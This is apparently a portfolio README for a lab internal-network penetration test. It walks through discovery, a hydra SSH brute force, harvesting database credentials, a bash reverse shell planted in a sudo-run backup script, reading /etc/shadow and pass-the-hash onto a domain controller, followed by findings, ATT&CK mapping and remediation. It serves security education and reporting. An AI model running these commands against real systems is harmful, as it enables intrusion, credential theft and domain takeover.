# Internal Network Penetration Test - Portfolio Project

A comprehensive 2-day internal network penetration assessment demonstrating complete attack chain execution from initial access to domain compromise. This project showcases real-world lateral movement techniques, privilege escalation methods, and professional security testing methodology.

## 📋 Project Overview

**Engagement Type:** Internal Network Penetration Test  
**Testing Focus:** Lateral Movement & Privilege Escalation  
**Duration:** 2 Days  
**Methodology:** OSSTMM-Compliant  
**Overall Risk Rating:** 🔴 CRITICAL

### Quick Metrics

- **Initial Compromise:** 45 minutes
- **Domain Compromise:** 5 hours
- **Systems Compromised:** 4 of 4
- **Critical Findings:** 3
- **Business Impact:** Critical Domain Control

## 🎯 Key Achievements

✅ **Complete Attack Chain** - Demonstrated realistic progression from initial access to domain administrator privileges  
✅ **Lateral Movement** - Successfully moved across 4 systems using credential reuse and network misconfigurations  
✅ **Privilege Escalation** - Exploited weak file permissions and sudo configurations to achieve root access  
✅ **Domain Compromise** - Leveraged pass-the-hash attacks to seize domain control  
✅ **Professional Reporting** - Mapped findings to MITRE ATT&CK framework with actionable remediation

## 📊 Attack Timeline

| Phase | Duration | Objective | Status |
|-------|----------|-----------|--------|
| Discovery & Enumeration | 30 min | Network mapping and service identification | ✅ Complete |
| Initial Compromise | 45 min | SSH credential attack via weak service account | ✅ Complete |
| Internal Reconnaissance | 60 min | Database access and credential harvesting | ✅ Complete |
| Lateral Movement | 75 min | Cross-system access using credential reuse | ✅ Complete |
| Privilege Escalation | 90 min | Root access via sudo abuse and script manipulation | ✅ Complete |
| Domain Compromise | 30 min | Pass-the-hash attack to domain controller | ✅ Complete |

## 🔍 Critical Findings Summary

### F-001: Weak Service Account Credentials
**CVSS: 8.1 (High)** | Service account `svc_webapp` using password `Summer2024!`  
*Impact:* Initial network foothold enabling further exploitation

### F-002: Database Credential Exposure
**CVSS: 6.5 (Medium)** | Plaintext credentials in `/var/www/html/config/database.php`  
*Impact:* Access to 15,000 customer records and credential harvesting

### F-003: Credential Reuse Across Systems
**CVSS: 8.8 (High)** | Domain user credentials valid on multiple systems  
*Impact:* Rapid lateral movement from web server to application tier

### F-004: Insecure File Permissions
**CVSS: 7.8 (High)** | World-writable backup script with sudo privileges  
*Impact:* Local privilege escalation to root

### F-005: Missing Network Segmentation
**CVSS: 9.1 (Critical)** | No isolation between application tiers  
*Impact:* Unrestricted lateral movement to domain controller

### F-006: Weak Password Hash Storage
**CVSS: 8.8 (High)** | Vulnerable to pass-the-hash attacks  
*Impact:* Domain administrator access without password knowledge

## 🛠️ Technical Execution

### Phase 1: Network Discovery

```bash
# Host discovery on target subnet
nmap -sn 192.168.78.0/24

# Comprehensive service enumeration
nmap -sS -sV -sC -p- 192.168.78.10,192.168.78.20,192.168.78.30,192.168.78.40
```

**Identified Systems:**
- `192.168.78.10` - web-server-01 (SSH, HTTP)
- `192.168.78.20` - app-server-01 (SSH, RDP)
- `192.168.78.30` - db-server-01 (MySQL)
- `192.168.78.40` - dc-01 (SMB, RDP)

### Phase 2: Initial Compromise

```bash
# SSH credential attack
hydra -L usernames.txt -P passwords.txt ssh://web-server-01.internal.corp

# Successful credentials
ssh svc_webapp@web-server-01.internal.corp
Password: Summer2024!  # SUCCESS
```

### Phase 3: Credential Discovery

```bash
# Database configuration with hardcoded credentials
cat /var/www/html/config/database.php
# Revealed: app_dbuser / DbAdmin123!

# MySQL database access
mysql -u app_dbuser -p'DbAdmin123!' -h db-server-01.internal.corp

# Extracted domain credentials from system_credentials table
# jsmith / Welcome123!
```

### Phase 4: Lateral Movement

```bash
# Credential reuse on application server
ssh jsmith@app-server-01.internal.corp
Password: Welcome123!  # SUCCESS

# Enumerated sudo permissions
sudo -l
# (root) NOPASSWD: /opt/scripts/backup.sh
```

### Phase 5: Privilege Escalation

```bash
# Modified world-writable backup script
echo "#!/bin/bash" > /opt/scripts/backup.sh
echo "bash -i >& /dev/tcp/192.168.78.100/4444 0>&1" >> /opt/scripts/backup.sh

# Executed with root privileges
sudo /opt/scripts/backup.sh

# Achieved root access and extracted system hashes
cat /etc/shadow
```

### Phase 6: Domain Compromise

```bash
# Pass-the-hash attack to domain controller
pth-winexe -U administrator//[extracted_hash] //dc-01.internal.corp cmd

# Confirmed domain administrator access
whoami  # NT AUTHORITY\SYSTEM

# Accessed sensitive repositories
dir C:\Finance\
dir C:\HR\Confidential\
```

## 📚 Documentation Structure

```
lateral-movement-assessment/
├── README.md                      # This file - project overview
├── EVIDENCE.md                    # Detailed technical evidence and screenshots
├── executive-summary.md           # Business-focused findings and impact
├── technical-report.md            # Exploitation narrative with command examples
├── findings-remediation.md        # Vulnerability details with remediation steps
├── mitre-mapping.md               # MITRE ATT&CK framework alignment
└── methodology/
    ├── testing-standards.md       # PTES, OSSTMM, NIST alignment
    ├── tools-techniques.md        # Arsenal and methodologies used
    └── detection-recommendations.md # SIEM queries and detection guidance
```

## 🗺️ MITRE ATT&CK Framework Coverage

This engagement demonstrates **15+ techniques** across **8 tactics:**

| Tactic | Key Techniques |
|--------|---|
| **Reconnaissance** | T1595.002 (Active Scanning), T1592.002 (Victim Host Information) |
| **Initial Access** | T1110.001 (Brute Force), T1078.003 (Valid Accounts) |
| **Discovery** | T1083 (File Discovery), T1018 (Remote System Discovery) |
| **Lateral Movement** | T1021.002 (SMB), T1021.004 (SSH), T1550.002 (Pass-the-Hash) |
| **Privilege Escalation** | T1548.003 (Sudo Abuse), T1055 (Process Injection) |
| **Credential Access** | T1003.008 (Hash Dumping), T1552.001 (Credentials in Files) |
| **Collection** | T1005 (Local Data), T1213 (Data Repositories) |
| **Command & Control** | T1071.001 (Web Protocols) |

## 🛡️ Skills Demonstrated

**Network Security:**
- Network enumeration and service discovery
- Vulnerability scanning and identification
- Network traffic analysis

**Exploitation & Post-Exploitation:**
- SSH credential attacks (hydra)
- Pass-the-hash attacks (impacket, pth-winexe)
- Privilege escalation techniques
- Credential harvesting and reuse

**System Administration Knowledge:**
- Linux privilege escalation paths
- Windows Active Directory attacks
- Service account security
- File permissions and sudo configurations

**Professional Practice:**
- OSSTMM-compliant testing methodology
- MITRE ATT&CK framework mapping
- Risk assessment and remediation planning
- Professional security reporting
- Executive communication of technical findings

## 📈 Business Impact Assessment

| Area | Impact |
|------|--------|
| **Data Exposure** | Customer databases (15,000 records), Financial records (2,400), HR documents |
| **Operational Risk** | Complete business disruption potential |
| **Compliance** | GDPR, SOX, PCI-DSS violations |
| **Reputational** | Loss of customer trust and brand integrity |

## ✅ Remediation Roadmap

**Immediate (0-7 days):**
- Enforce strong password policies (14+ characters, complexity)
- Implement MFA for remote access
- Rotate all service account credentials
- Change reused domain user passwords

**Short-term (7-30 days):**
- Deploy secure credential storage (HashiCorp Vault, Azure Key Vault)
- Fix file permissions and audit sudo configurations
- Implement database connection encryption
- Enable database access logging

**Medium-term (30-90 days):**
- Implement network segmentation between tiers
- Deploy firewall rules restricting lateral movement
- Establish Privileged Access Management (PAM) solution
- Implement Credential Guard and LAPS
- Deploy network access control (NAC)

## 🔄 Verification & Follow-up

Retesting recommended after 90 days to verify remediation effectiveness and identify any residual or emerging risks.

## ⚠️ Legal & Ethical Notice

This assessment was conducted in a controlled lab environment for educational purposes and portfolio demonstration. All techniques demonstrated represent legitimate penetration testing practices that should only be used with proper authorization and in compliance with applicable laws and regulations (CFAA, Computer Misuse Act, etc.).

## 📞 Contact & Documentation

For detailed technical evidence, command outputs, and exploitation chains, see `EVIDENCE.md`  
For remediation details and countermeasures, see `findings-remediation.md`  
For MITRE ATT&CK mapping and detection strategies, see `mitre-mapping.md`

---

**Assessment Date:** October 15-16, 2024  
**Methodology:** OSSTMM-Compliant | PTES Framework | NIST SP 800-115  
**Status:** ✅ Complete | 🟢 Ready for Review
